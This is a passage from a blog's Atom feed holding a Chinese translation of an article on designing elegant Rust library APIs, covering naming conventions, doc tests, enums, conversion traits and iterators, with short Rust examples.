<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="https://www.w3.org/2005/Atom">
  <title>Aloxaf&#39;s blog</title>
  
  <subtitle>Aloxaf的个人博客, 记录一些乱七八糟的东西</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.aloxaf.com/"/>
  <updated>2019-11-20T13:55:09.000Z</updated>
  <id>https://www.aloxaf.com/</id>
  
  <author>
    <name>Aloxaf</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【译】设计优雅的 Rust 库 API</title>
    <link href="https://www.aloxaf.com/2019/11/elegant_apis_in_rust/"/>
    <id>https://www.aloxaf.com/2019/11/elegant_apis_in_rust/</id>
    <published>2019-11-20T13:55:09.000Z</published>
    <updated>2019-11-20T13:55:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>一篇讲述 Rust API 设计原则的经典老文，虽然老但仍然值得阅读。前几天有事情把它从旮旯里翻出来了，虽然是经典老文但我估计很多人都没有读过，最近闲着没事干脆用我的辣鸡英语水平翻译一下，也算为 Rust 中文社区做一点贡献。</p><p>原文见：<a href="https://deterministic.space/elegant-apis-in-rust.html" target="_blank" rel="noopener">https://deterministic.space/elegant-apis-in-rust.html</a></p><a id="more"></a><h1 id="设计优雅的-rust-库-api"><a class="headerlink" href="#设计优雅的-rust-库-api"></a>设计优雅的 Rust 库 API</h1><p>在选择一门编程语言时，是否拥有简洁易用的库也是一个重要的考量因素。这篇文章会教授你如何为你的 Rust 库编写优雅的 API。（不过文中的许多观点也适用于其他语言。）</p><p><a href="https://www.youtube.com/watch?v=0zOg8_B71gE" target="_blank" rel="noopener">你也可以观看我在 Rustfest 2017 上的演讲！</a></p><h2 id="什么是优雅的-api"><a class="headerlink" href="#什么是优雅的-api"></a>什么是优雅的 API</h2><ul><li>方法名清晰易懂，以让调用了这个 API 的代码易于阅读。</li><li>有规律、可猜测的方法名在使用 API 时也很有用，可以减少阅读文档的需求。</li><li>每个 API 都有至少要有文档和一小段示例代码。</li><li>用户几乎不需要编写样板代码（boilerplate code）来使用这个 API，因为<ul><li>它广泛接受各种输入类型（当然类型转换是显式的）</li><li>并且也有足以应付大部分常用情况的一键 API</li></ul></li><li>充分利用类型来防止逻辑错误，但不会太妨碍使用。</li><li>返回有意义的错误，并且在文档中注明会导致 panic 的情况。</li></ul><h2 id="技术"><a class="headerlink" href="#技术"></a>技术</h2><h3 id="一致的命名"><a class="headerlink" href="#一致的命名"></a>一致的命名</h3><p>有一些 Rust RFC 描述了标准库的命名方案。你也应该遵循它们，以让用户能迅速上手使用你的库。</p><ul><li><a href="https://github.com/rust-lang/rfcs/blob/1f5d3a9512ba08390a2226aa71a5fe9e277954fb/text/0199-ownership-variants.md" target="_blank" rel="noopener">RFC 199</a> 解释说应该使用 <code>mut</code>、<code>move</code> 或 <code>ref</code> 作为后缀，来根据参数的可变性区分方法。</li><li><a href="https://github.com/rust-lang/rfcs/blob/1f5d3a9512ba08390a2226aa71a5fe9e277954fb/text/0344-conventions-galore.md" target="_blank" rel="noopener">RFC 344</a> 定义了一些有意思的约定，比如：<ul><li>如何在方法名称中引用类型名称（如 <code>&amp;mut [T]</code> 变成 <code>mut_slice</code>、<code>*mut T</code> 变成 <code>mut ptr</code>），</li><li>如何命名返回迭代器的方法，</li><li>getter 方法应该被命名为 <code>field_name</code> 而 setter 方法应该被命名为 <code>set_field_name</code>，</li><li>如何命名 trait：“优先选择（及物）动词、名词，然后是形容词；避免语法后缀（如 able）”，而且“如果这个 trait 只有一个主要方法，可以考虑用方法名称来命名 trait 本身”，</li><li><a href="https://github.com/rust-lang/rfcs/blob/1f5d3a9512ba08390a2226aa71a5fe9e277954fb/text/0430-finalizing-naming-conventions.md" target="_blank" rel="noopener">RFC 430</a> 描述了一些通用的大小写约定（总结：<code>CamelCase</code> 用于类型级别，<code>snake_case</code> 用于变量级别）。</li><li><a href="https://github.com/rust-lang/rfcs/blob/1f5d3a9512ba08390a2226aa71a5fe9e277954fb/text/0445-extension-trait-conventions.md" target="_blank" rel="noopener">RFC 445</a> 希望你为扩展 trait（extension trait）添加 <code>Ext</code> 后缀。</li></ul></li></ul><h4 id="更多的方法名称约定"><a class="headerlink" href="#更多的方法名称约定"></a>更多的方法名称约定</h4><p>除了 <a href="https://github.com/rust-lang/rfcs/blob/1f5d3a9512ba08390a2226aa71a5fe9e277954fb/text/0199-ownership-variants.md" target="_blank" rel="noopener">RFC 199</a> 和 <a href="https://github.com/rust-lang/rfcs/blob/1f5d3a9512ba08390a2226aa71a5fe9e277954fb/text/0344-conventions-galore.md" target="_blank" rel="noopener">RFC 344</a> （见上）规定的以外，还有一些其他的关于如何选择方法名称的约定，目前还没有在 RFC 中提及。这些约定大部分都在<a href="https://doc.rust-lang.org/1.12.0/style/style/naming/conversions.html" target="_blank" rel="noopener">旧的 Rust 风格指南</a>和 <a href="https://twitter.com/llogiq" target="_blank" rel="noopener">@llogiq</a> 的文章 <a href="https://llogiq.github.io/2016/02/11/rustic.html" target="_blank" rel="noopener">Rustic Bits</a> 以及 <a href="https://github.com/Manishearth/rust-clippy" target="_blank" rel="noopener">clippy</a> 的 <a href="https://github.com/Manishearth/rust-clippy/blob/55e67bfc105ef6abf0997584e0e84cc939f35dc6/clippy_lints/src/methods.rs#L88-L110" target="_blank" rel="noopener"><code>wrong_self_convention</code></a> 检测项中提到了。这里总结一下。</p><table><thead><tr><th>方法名称</th><th>参数</th><th>备注</th><th>举例</th></tr></thead><tbody><tr><td><code>new</code></td><td>无 self，通常 &gt;= 1 <sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></td><td>构造器，另参见 <a href="https://doc.rust-lang.org/std/default/trait.Default.html" target="_blank" rel="noopener"><code>Default</code></a></td><td><code>Box::new</code>、<code>std::net::Ipv4Addr::new</code></td></tr><tr><td><code>with_...</code></td><td>无 self，&gt;= 1</td><td>其他构造器</td><td><code>Vec::with_capacity</code>、<code>regex::Regex::with_size_limit</code></td></tr><tr><td><code>from_...</code></td><td>1</td><td>参见<a href="#%E4%BD%BF%E7%94%A8%E8%BD%AC%E6%8D%A2-trait">转换 trait（conversion traits）</a></td><td><code>String::from_utf8_lossy</code></td></tr><tr><td><code>as_...</code></td><td><code>&amp;self</code></td><td>无开销的转换，返回数据的一个视图（view）</td><td><code>str::as_bytes</code>、<code>uuid::Uuid::as_bytes</code></td></tr><tr><td><code>to_...</code></td><td><code>&amp;self</code></td><td>昂贵（高开销）的转换</td><td><code>str::to_string</code>、<code>std::path::Path::to_str</code></td></tr><tr><td><code>into_...</code></td><td><code>self</code>（消耗）</td><td>可能昂贵的转换，参见 <a href="#%E4%BD%BF%E7%94%A8%E8%BD%AC%E6%8D%A2-trait">转换 trait（conversion traits）</a></td><td><code>std::fs::File::into_raw_fd</code></td></tr><tr><td><code>is_...</code></td><td><code>&amp;self</code>（或无）</td><td>期望返回 <code>bool</code></td><td><code>slice::is_empty</code>、<code>Result::is_ok</code>、<code>std::path::Path::is_file</code></td></tr><tr><td><code>has_...</code></td><td><code>&amp;self</code> （或无）</td><td>期望返回 <code>bool</code></td><td><code>regex_syntax::Expr::has_bytes</code></td></tr></tbody></table><h3 id="文档测试"><a class="headerlink" href="#文档测试"></a>文档测试</h3><p>编写带有示例代码的文档可以展示 API 的用法而且还能获得自动测试——一石二鸟。详见第一版 TRPL（The Rust Programming Language）的<a href="https://kaisery.gitbooks.io/rust-book-chinese/content/content/Documentation%20%E6%96%87%E6%A1%A3.html#%E7%94%A8%E4%BD%9C%E6%B5%8B%E8%AF%95%E7%9A%84%E6%96%87%E6%A1%A3" target="_blank" rel="noopener">文档</a>一节。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// 使用魔法操作数字</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// # 示例</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// ```rust</span></span><br><span class="line"><span class="comment">/// assert_eq!(min( 0,   14),    0);</span></span><br><span class="line"><span class="comment">/// assert_eq!(min( 0, -127), -127);</span></span><br><span class="line"><span class="comment">/// assert_eq!(min(42,  666),   42);</span></span><br><span class="line"><span class="comment">/// ```(由于 hexo markdown 渲染辣鸡，此处加点文字避免被渲染为单独代码块）</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">min</span></span>(lhs: <span class="built_in">i32</span>, rhs: <span class="built_in">i32</span>) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line"><span class="keyword">if</span> lhs &lt; rhs &#123; lhs &#125; <span class="keyword">else</span> &#123; rhs &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你还可以使用 <code>#![deny(missing_docs)]</code> 来强制保证每个公开 API 都有文档。你可能也会对我的这篇提出了 <a href="https://deterministic.space/machine-readable-inline-markdown-code-cocumentation.html" target="_blank" rel="noopener">Rust 文档格式化约定</a>的文章感兴趣。</p><h3 id="不要在-api-中使用-字符串类型"><a class="headerlink" href="#不要在-api-中使用-字符串类型"></a>不要在 API 中使用 “字符串类型”</h3><p>用多了动态语言，你可能倾向于在不同地方使用特定的字符串来代表不同含义。</p><p>举例：你想写一个能够用不同颜色输出文字的函数，于是你写下了类型为 <code>&amp;str</code> 的参数 <code>color</code>。你希望你的用户能够自己在特定的颜色集合中选择需要的颜色（比如 <code>[&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;, &quot;light golden rod yellow&quot;]</code>）。</p><p>但是在 Rust 中你<strong>不应该</strong>这样做！如果你事先知道<strong>所有</strong>可能的值，请使用 <code>enum</code>。这样，你就不需要对字符串进行解析（parse）或者模式匹配——也不用处理可能出现的错误——而且能确保你的用户提供的输入一定是有效的<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Color</span></span> &#123; Red, Green, Blue, LightGoldenRodYellow &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">color_me</span></span>(input: &amp;<span class="built_in">str</span>, color: Color) &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    color_me(<span class="string">"surprised"</span>, Color::Blue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="全是常量的模块"><a class="headerlink" href="#全是常量的模块"></a>全是常量的模块</h4><p>或者，如果你想表达更复杂的值的话，则可以定义一个新的 <code>struct</code>，然后定义一堆公共常量。然后把这些常量放到模块中，用户就可以使用与 <code>enum</code> 类似的语法来访问它们了。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">mod</span> output_options &#123;</span><br><span class="line">    <span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">OutputOptions</span></span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">impl</span> OutputOptions &#123; <span class="function"><span class="keyword">fn</span> <span class="title">new</span></span>(<span class="comment">/* ... */</span>) -&gt; OutputOptions &#123; <span class="comment">/* ... */</span> &#125; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">const</span> DEFAULT: OutputOptions = OutputOptions &#123; <span class="comment">/* ... */</span> &#125;;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">const</span> SLIM: OutputOptions = OutputOptions &#123; <span class="comment">/* ... */</span> &#125;;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">const</span> PRETTY: OutputOptions = OutputOptions &#123; <span class="comment">/* ... */</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">output</span></span>(f: &amp;Foo, opts: OutputOptions) &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> foo = Foo::new();</span><br><span class="line">    </span><br><span class="line">    output(foo, output_options::PRETTY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用-fromstr-来解析字符串"><a class="headerlink" href="#使用-fromstr-来解析字符串"></a>使用 <code>FromStr</code> 来解析字符串</h4><p>在某些情况下，你的用户确实不得不使用字符串，比如：从环境变量中读取或者读取<strong>他们的</strong>用户的输入作为参数——也就是说，他们没办法在代码中编写（静态）字符串传递给你的 API（这个也是我们尝试阻止的）。这种情况下就需要使用 <a href="https://doc.rust-lang.org/std/str/trait.FromStr.html" target="_blank" rel="noopener"><code>FromStr</code></a> triat 了，它抽象了 “解析字符串到 Rust 数据类型” 的行为。</p><p>如果你要做的只是简单地将包含有效成员（variant）名称的字符串映射到正确的枚举（enum）成员上，你可以使用<a href="https://play.rust-lang.org/?gist=c5610c31b8469422e57c23721cba09f8&amp;version=nightly&amp;backtrace=0" target="_blank" rel="noopener">这个宏</a>（来自 <a href="https://twitter.com/killercup/status/773432184199847940" target="_blank" rel="noopener">这条 tweet</a>；应该也有一个库用来做这件事情)。</p><p>根据你的 API 设计，你也可以选择让你的用户来解析字符串。如果你提供了正确的类型和实现，这应该不会很难（不过仍然需要在文档中注明）。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 选择 A: 你来解析</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">output_a</span></span>(f: &amp;Foo, color: &amp;<span class="built_in">str</span>) -&gt; <span class="built_in">Result</span>&lt;Bar, ParseError&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里使用解析后的类型遮蔽掉了原来的 `color`</span></span><br><span class="line">    <span class="keyword">let</span> color: Color = <span class="built_in">try!</span>(color.parse());</span><br><span class="line"></span><br><span class="line">    f.to_bar(&amp;color)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择 B: 用户来解析</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">output_b</span></span>(f: &amp;Foo, color: &amp;Color) -&gt; Bar &#123;</span><br><span class="line">    f.to_bar(color)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> foo = Foo::new();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 选择 A: 你来解析，用户来处理 API 错误</span></span><br><span class="line">    output_a(foo, <span class="string">"Green"</span>).expect(<span class="string">"Error :("</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 选择 B: 用户传入有效类型，所以不需要处理错误</span></span><br><span class="line">    output_b(foo, Color::Green);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 选择 B: 用户使用字符串，需要自己解析并处理错误</span></span><br><span class="line">    output_b(foo, <span class="string">"Green"</span>.parse().except(<span class="string">"Parse error!"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="错误处理"><a class="headerlink" href="#错误处理"></a>错误处理</h3><p>TRPL 中对于错误处理<a href="https://kaisery.gitbooks.io/rust-book-chinese/content/content/Error%20Handling%20%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86.html" target="_blank" rel="noopener">有一章</a>写得很不错。（译注：也可以参阅<a href="https://kaisery.github.io/trpl-zh-cn/ch09-00-error-handling.html" target="_blank" rel="noopener">第二版 TRPL</a>或<a href="https://rustwiki.org/zh-CN/rust-by-example/error.html" target="_blank" rel="noopener">Rust By Example</a>的错误处理章节）</p><p>也有一些 crate 可以用来减少编写良好错误类型所需的样板代码，比如  <a href="https://crates.io/crates/quick-error" target="_blank" rel="noopener">quick-error</a> 和 <a href="https://crates.io/crates/error-chain" target="_blank" rel="noopener">error-chain</a>。(译注：现在应该用 <a href="https://crates.io/crates/anyhow" target="_blank" rel="noopener">anyhow</a> 和 <a href="https://crates.io/crates/thiserror" target="_blank" rel="noopener">thiserror</a> 了)</p><h3 id="公共类型别名"><a class="headerlink" href="#公共类型别名"></a>公共类型别名</h3><p>如果你的内部代码常常使用某个参数相同的泛型类型，此时可以使用类型别名。如果你想把这些类型公开给你的用户，你也应该把这些别名同样公开给用户（当然记得文档）。</p><p>一个常见情况是 <code>E</code> 为固定值的 <code>Result&lt;T, E&gt;</code> 类型。比如 <a href="https://doc.rust-lang.org/std/io/type.Result.html" target="_blank" rel="noopener"><code>std::io::Result&lt;T&gt;</code></a> 是 <code>Result&lt;T, std::io::Error&gt;</code> 的别名，<a href="https://doc.rust-lang.org/std/fmt/type.Result.html" target="_blank" rel="noopener"><code>std::fmt::Result</code></a> 是 <code>Result&lt;(), std::fmt::Error&gt;</code> 的别名，<a href="https://github.com/serde-rs/json/blob/e5f9ca89c6de1a7bf86aff0283bcd83845b05576/json/src/error.rs#L258" target="_blank" rel="noopener"><code>serde_json::error::Result&lt;T&gt;</code></a> 是 <code>Result&lt;T, serde_json::error::Error&gt;</code> 的别名。</p><h3 id="使用转换-trait"><a class="headerlink" href="#使用转换-trait"></a>使用转换 trait</h3><p>一个良好实践是永远也不要在参数中使用 <code>&amp;String</code> 和 <code>&amp;Vec&lt;T&gt;</code>，取而代之使用 <code>&amp;str</code> 和 <code>&amp;[T]</code>，后者允许传入更多类型。（基本上是所有能 <code>deref</code> 到字符串或切片（slice）的类型）</p><p>我们可以在更高抽象的层次上应用这个想法：与其使用具体类型作为参数，不如使用拥有严格约束的泛型。这样做的缺点是文档的可读性会降低，因为它充满了大量复杂的泛型约束！</p><p><a href="https://doc.rust-lang.org/std/convert/index.html" target="_blank" rel="noopener"><code>std::convert</code></a> 为提供了一些方便的工具：</p><ul><li><code>AsMut</code>：一个便宜的（低消耗）、可变引用到可变引用的转换。</li><li><code>AsRef</code>：一个便宜的，引用到引用的转换。</li><li><code>From</code>： 通过转换来构造自身</li><li><code>Into</code>：一个消耗会自身的转换，可能会比较昂贵（高开销）。</li><li><code>TryFrom</code>：尝试通过转换来构造自身</li><li><code>TryInto</code>：尝试消耗自身转的换，可能会比较昂贵。</li></ul><p>你可能也会喜欢<a href="https://ricardomartins.cc/2016/08/03/convenient_and_idiomatic_conversions_in_rust" target="_blank" rel="noopener">这篇关于如何在 Rust 中进行方便地道的转换的文章</a>.</p><h4 id="cow"><a class="headerlink" href="#cow"></a>Cow</h4><p>如果你需要处理很多不确定是否需要进行分配（allocate）的东西，你应该使用<a href="https://doc.rust-lang.org/std/borrow/enum.Cow.html" target="_blank" rel="noopener"><code>Cow&lt;'a, B&gt;</code></a>，它可以让你抽象借用和拥有所有权的数据。</p><h4 id="例：std-convert-into"><a class="headerlink" href="#例：std-convert-into"></a>例：<a href="https://doc.rust-lang.org/std/convert/trait.Into.html" target="_blank" rel="noopener"><code>std::convert::Into</code></a></h4><table><thead><tr><th><code>fn foo(p: PathBuf)</code></th><th><code>fn foo&lt;P: Into&lt;PathBuf&gt;&gt;(p: P)</code></th></tr></thead><tbody><tr><td>用户需要把数据转为 <code>PathBuf</code></td><td>由库来调用 <code>.into()</code> 进行转换</td></tr><tr><td>用户进行分配</td><td>看不出：库可能进行分配</td></tr><tr><td>用户需要关心 <code>PathBuf</code> 是什么、如何创建</td><td>用户可以传递 <code>String</code> 、<code>OsString</code>，或者 <code>PathBuf</code> 都行</td></tr></tbody></table><h4 id="into-option"><a class="headerlink" href="#into-option"></a><code>Into&lt;Option&lt;_&gt;&gt;</code></h4><p><a href="https://github.com/rust-lang/rust/pull/34828" target="_blank" rel="noopener">这个 PR</a> 添加了一个 <code>impl&lt;T&gt; From&lt;T&gt; for Option&lt;T&gt;</code>，在 Rust 1.12 中正式实装。寥寥几行代码赋予了你编写可以被直接调用而不需要写一大堆 <code>Some(...)</code> 的 API 的能力。</p><p><a href="https://play.rust-lang.org/?gist=68645e903a2f903cf43d3070d562a809&amp;version=nightly&amp;backtrace=0" target="_blank" rel="noopener">原先：</a></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于 API 作者来说很容易编写，文档也很易于阅读</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">foo</span></span>(lorem: &amp;<span class="built_in">str</span>, ipsum: <span class="built_in">Option</span>&lt;<span class="built_in">i32</span>&gt;, dolor: <span class="built_in">Option</span>&lt;<span class="built_in">i32</span>&gt;, sit: <span class="built_in">Option</span>&lt;<span class="built_in">i32</span>&gt;) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, lorem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    foo(<span class="string">"bar"</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>);               <span class="comment">// 看起来有些奇怪</span></span><br><span class="line">    foo(<span class="string">"bar"</span>, <span class="literal">Some</span>(<span class="number">42</span>), <span class="literal">None</span>, <span class="literal">None</span>);           <span class="comment">// 还好</span></span><br><span class="line">    foo(<span class="string">"bar"</span>, <span class="literal">Some</span>(<span class="number">42</span>), <span class="literal">Some</span>(<span class="number">1337</span>), <span class="literal">Some</span>(-<span class="number">1</span>)); <span class="comment">// 停！太多…… Some 了……</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://play.rust-lang.org/?gist=23b98645fa7fd68cb9e28da9425a62f9&amp;version=nightly&amp;backtrace=0" target="_blank" rel="noopener">现在：</a></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于 API 作者来说得多打点字</span></span><br><span class="line"><span class="comment">// （而且遗憾的是，每个参数都需要被单独指定——否则 Rust 只会根据第一个参数推断类型。</span></span><br><span class="line"><span class="comment">// 这种写法阅读来不是很方便，文档可能也没那么好看）</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">foo</span></span>&lt;I, D, S&gt;(lorem: &amp;<span class="built_in">str</span>, ipsum: I, dolor: D, sit: S) <span class="keyword">where</span></span><br><span class="line">    I: <span class="built_in">Into</span>&lt;<span class="built_in">Option</span>&lt;<span class="built_in">i32</span>&gt;&gt;,</span><br><span class="line">    D: <span class="built_in">Into</span>&lt;<span class="built_in">Option</span>&lt;<span class="built_in">i32</span>&gt;&gt;,</span><br><span class="line">    S: <span class="built_in">Into</span>&lt;<span class="built_in">Option</span>&lt;<span class="built_in">i32</span>&gt;&gt;,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, lorem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    foo(<span class="string">"bar"</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>); <span class="comment">// 仍然奇怪</span></span><br><span class="line">    foo(<span class="string">"bar"</span>, <span class="number">42</span>, <span class="literal">None</span>, <span class="literal">None</span>);   <span class="comment">// 不错</span></span><br><span class="line">    foo(<span class="string">"bar"</span>, <span class="number">42</span>, <span class="number">1337</span>, -<span class="number">1</span>);     <span class="comment">// Wow，棒棒！请务必这样编写 API！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="关于可能较长的编译时间的说明"><a class="headerlink" href="#关于可能较长的编译时间的说明"></a>关于可能较长的编译时间的说明</h4><p>如果你有：</p><ol><li>很多类型参数（比如用于转换 trait）</li><li>用在一个很复杂/大型的函数上面</li><li>这个函数用得还很多</li></ol><p>然后 <code>rustc</code> 将会根据不同参数编译这个函数的大量排列组合（泛型函数的单态化），这会导致很长的编译时间。</p><p><a href="https://github.com/bluss" target="_blank" rel="noopener">bluss</a> 在 <a href="https://www.reddit.com/r/rust/comments/556c0g/optional_arguments_in_rust_112/d8839pu?context=1" target="_blank" rel="noopener">Reddit</a> 上提到可以使用 “去泛型” 技术来规避这个问题：你的（公共）泛型函数只简单地调用另一个（私有）非泛型函数，这样这个私有函数就只会被编译一次。</p><p>bluss 给的例子是 <code>std::fs::OpenOptions::open</code> 的实现（来自 Rust 1.12 的<a href="https://doc.rust-lang.org/1.12.0/src/std/up/src/libstd/fs.rs.html#599-604" target="_blank" rel="noopener">源码</a>）和 <code>image</code> crate 的 <a href="https://github.com/PistonDevelopers/image/pull/518" target="_blank" rel="noopener">这个PR</a>，它将 <code>open</code> 函数修改成了这个样子：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">open</span></span>&lt;P&gt;(path: P) -&gt; ImageResult&lt;DynamicImage&gt; <span class="keyword">where</span> P: <span class="built_in">AsRef</span>&lt;Path&gt; &#123;</span><br><span class="line">    <span class="comment">// 简单的包装函数，在调用 open_impl 之前去掉泛型</span></span><br><span class="line">    open_impl(path.as_ref())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="惰性"><a class="headerlink" href="#惰性"></a>惰性</h3><p>尽管 Rust 不能像 Haskell 一样对表达式进行惰性计算，但是你仍然可以使用一些技术来优雅地省略不必要的计算和分配。</p><h4 id="使用迭代器-iterator"><a class="headerlink" href="#使用迭代器-iterator"></a>使用迭代器（Iterator）</h4><p>标准库中最绝妙的构造之一是 <code>Iterator</code>，它是一个 trait，允许类似生成器的值迭代，而你只需要为此实现一个 <code>next</code> 方法<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>。Rust 的迭代器是惰性的，你需要显式地调用一个消费函数才会开始迭代。只是编写 <code>&quot;hello&quot;.chars().filter(char::is_white_space)</code> 不会对数据进行任何<strong>操作</strong>，直到你对它调用像 <code>.collect::&lt;String&gt;()</code> 这样的方法。</p><h5 id="迭代器作为参数"><a class="headerlink" href="#迭代器作为参数"></a>迭代器作为参数</h5><p>使用迭代器作为输入可能会让你的 API 更加难以阅读（<code>T: Iterator&lt;Item=Thingy&gt;</code> vs <code>&amp;[Thingy]</code>），但是可以让用户避免内存分配。</p><p>不过，<strong>事实上</strong>，你可能也并不想接受一个宽泛的 <code>Iterator</code>：而是使用 <a href="https://doc.rust-lang.org/std/iter/trait.IntoIterator.html" target="_blank" rel="noopener"><code>IntoIterator</code></a> 。这样你就可以得到一个通过调用 <code>.into_iter()</code> 就能轻松转换为迭代器的类型。判断哪些类型实现了 <code>IntoIterator</code> 也很简单——就如文档中所说的：</p><blockquote><p>实现 IntoIterator 的好处之一就是你的类型将适用于 Rust 的 for 循环。</p></blockquote><p>也就说是，任何可以在 <code>for</code> 循环中使用的类型，都可以被传递给你的函数。</p><h5 id="返回-实现迭代器"><a class="headerlink" href="#返回-实现迭代器"></a>返回/实现迭代器</h5><p>如果你想返回一些你的用户可以当做迭代器来使用的东西，最好的方式是定义一个实现了 <code>Iterator</code> 的新类型。当 <code>impl Trait</code> 稳定以后（见<a href="https://github.com/rust-lang/rust/issues/34511" target="_blank" rel="noopener">这个跟踪 issue</a>）（译注：已稳定）可能会更简单。你可以在这篇<a href="https://github.com/alexcrichton/futures-rs/blob/f78905e584d06e69e5237ca12745ccd3d6f4a73a/TUTORIAL.md#returning-futures" target="_blank" rel="noopener"><code>futures</code> 教程</a>中找到更多信息（返回 <code>Future</code> 和返回 <code>Iterator</code> 是类似的）。</p><h5 id="类似-iterator-的-trait"><a class="headerlink" href="#类似-iterator-的-trait"></a>类似 